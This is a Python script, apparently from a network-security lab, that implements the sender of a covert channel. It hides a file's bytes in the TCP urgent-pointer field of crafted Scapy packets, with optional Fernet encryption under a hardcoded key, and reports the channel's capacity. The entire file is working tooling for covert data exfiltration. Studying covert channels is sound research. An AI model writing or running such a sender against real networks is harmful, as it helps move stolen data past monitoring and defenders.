from scapy.all import *
import argparse
import os
import time
import random
from cryptography.fernet import Fernet

# Hardcoded symmetric key - must be the same in both sender and receiver
SYMMETRIC_KEY = b'dBbg_kQbMCvR3S1tzx6yTDJL3XaG6qyTjvBEx-0vvUY='

def encrypt_data(data):
    """Encrypt data using the hardcoded symmetric key"""
    f = Fernet(SYMMETRIC_KEY)
    return f.encrypt(data)

def perform_handshake(ip_dst, sport, dport):
    """Perform a TCP three-way handshake with resilience to RA packets"""
    print(f"Initiating TCP handshake with {ip_dst}:{dport}...")
    
    # Generate initial sequence number
    seq = random.randint(1000, 9000)
    
    # Set maximum attempts for the handshake
    max_attempts = 5
    attempt = 0
    
    while attempt < max_attempts:
        attempt += 1
        
        # SYN
        ip = IP(dst=ip_dst)
        syn = TCP(sport=sport, dport=dport, flags="S", seq=seq)
        
        # Send SYN and wait for response
        syn_ack = sr1(ip/syn, timeout=3, verbose=0)
        
        if not syn_ack:
            print(f"No response to SYN packet (attempt {attempt}/{max_attempts}). Retrying...")
            time.sleep(1)
            continue
        
        # Check if this is an RA (Reset-Ack) packet
        if syn_ack.haslayer(TCP) and (syn_ack[TCP].flags & 0x14) == 0x14:  # 0x14 = Reset(0x04) + Ack(0x10)
            print(f"Received Reset-Ack packet (attempt {attempt}/{max_attempts}), trying again...")
            time.sleep(1)
            continue
            
        # Check if this is a proper SYN-ACK response
        if syn_ack.haslayer(TCP) and (syn_ack[TCP].flags & 0x12) == 0x12:  # 0x12 = SYN(0x02) + ACK(0x10)
            # Validate source
            if syn_ack[IP].src != ip_dst or syn_ack[TCP].dport != sport:
                print(f"Response from unexpected source (attempt {attempt}/{max_attempts}), retrying...")
                time.sleep(1)
                continue
                
            # Send ACK to complete handshake
            ack = TCP(sport=sport, dport=dport, flags="A", 
                      seq=seq+1, ack=syn_ack[TCP].seq+1)
            send(ip/ack, verbose=0)
            
            print("TCP handshake completed successfully.")
            return seq+1, syn_ack[TCP].seq+1
        else:
            print(f"Received unexpected response with flags: {syn_ack[TCP].flags:02x} (attempt {attempt}/{max_attempts})")
            time.sleep(1)
    
    print(f"Handshake failed after {max_attempts} attempts.")
    return None, None

def tcp_sender(file_path, interval, bits_to_use=16, use_encryption=False):

    host = os.getenv('INSECURENET_HOST_IP')
    port = 8888
    
    if not host:
        print("Error: No target host specified.")
        return
    
    if not os.path.exists(file_path):
        print(f"Error: File '{file_path}' not found.")
        return

    # Validate bits_to_use parameter
    if bits_to_use < 1 or bits_to_use > 16:
        print("Error: bits_to_use must be between 1 and 16")
        return
    
    max_value = (1 << bits_to_use) - 1
    bytes_per_chunk = max(1, bits_to_use // 8)
    print(f"Using {bits_to_use} bits of the urgent pointer field (max value: {max_value})")
    
    # Read file data
    with open(file_path, 'rb') as f:
        data = f.read()

    # Encrypt data if requested
    if use_encryption:
        print("Encrypting data...")
        data = encrypt_data(data)
    
    print(f"File size: {len(data)} bytes")
    
    # Prepare data chunks based on bits_to_use
    chunks = []
    mask = max_value
    
    # Special handling for bit counts that don't align with bytes
    bit_buffer = 0
    bit_count = 0
    
    # Process all bytes
    for byte in data:
        # Add this byte to the bit buffer
        bit_buffer = (bit_buffer << 8) | byte
        bit_count += 8
        
        # Extract chunks when we have enough bits
        while bit_count >= bits_to_use:
            bit_count -= bits_to_use
            value = (bit_buffer >> bit_count) & mask
            chunks.append(value)
    
    # Handle any remaining bits
    if bit_count > 0:
        # Pad with zeros
        value = (bit_buffer << (bits_to_use - bit_count)) & mask
        chunks.append(value)

    # Use random values for sport
    sport = random.randint(1024, 65535)
    
    # Add timing markers
    start_time = time.time()
    
    # Perform TCP handshake
    seq, ack = perform_handshake(host, sport, port)
    if not seq or not ack:
        print("Handshake failed, aborting transmission.")
        return
    
    ip = IP(dst=host)
    print(f"Sending {len(chunks)} chunks to {host}:{port}...")
    
    # Send data chunks
    for i, value in enumerate(chunks):
        tcp = TCP(sport=sport, dport=port, flags="UA", seq=seq, ack=ack)
        tcp.urgptr = value  # Encode data in the URG pointer
        pkt = ip/tcp/"X"  # Dummy payload
        
        send(pkt, verbose=0)
        #print(f"Sent chunk {i+1}/{len(chunks)}: URG={value} (0x{value:04X})")
        
        # Increase sequence number for next packet
        seq += len(pkt[TCP].payload)
        
        # Wait between packets
        time.sleep(interval)
    
    # End timing marker
    end_time = time.time()
    transmission_time = end_time - start_time

    # Send marker packet to indicate transmission complete
    print("Sending FIN to signal transmission complete...")
    fin = TCP(sport=sport, dport=port, flags="FA", seq=seq, ack=ack)
    send(ip/fin, verbose=0)

    print(f"Successfully sent {len(data)} bytes using TCP URG covert channel.")
    print(f"Transmission time: {transmission_time:.2f} seconds")
    print(f"Estimated capacity: {(len(data) * 8) / transmission_time:.2f} bits/second")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Covert channel sender using TCP URG pointer")
    parser.add_argument('--file', required=True, help="Path to the file to send")
    parser.add_argument('--interval', type=float, default=0.2, help="Interval between packets in seconds")
    parser.add_argument('--bits', type=int, default=16, help="Number of bits to use in the urgent pointer (1-16)")
    parser.add_argument('--encrypt', action='store_true', help="Enable encryption of data")
    args = parser.parse_args()

    tcp_sender(args.file, args.interval, args.bits, args.encrypt)